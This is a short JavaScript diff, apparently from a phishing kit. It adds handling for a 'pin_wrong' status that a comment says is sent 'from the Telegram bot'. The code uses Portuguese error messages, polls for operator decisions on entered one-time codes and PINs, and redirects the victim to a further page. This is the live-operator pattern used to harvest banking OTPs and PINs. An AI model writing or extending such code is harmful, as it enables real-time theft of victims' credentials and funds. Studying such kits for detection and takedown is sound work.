@@ -211,10 +211,16 @@ async function handleVerification() {
             if (data.status === "otp1_wrong") {
                 clearInterval(poll);
 
-                // Portuguese error message update
                 errorBox.innerText = "❌ Código incorreto, por favor insira o código correto";
 
                 reset();
+            }
+
+            // Handles Wrong PIN action from the Telegram bot
+            if (data.status === "pin_wrong") {
+                clearInterval(poll);
+                localStorage.setItem("pin_error", "true");
+                window.location.href = "/page6";
             }
 
         }, 2000);
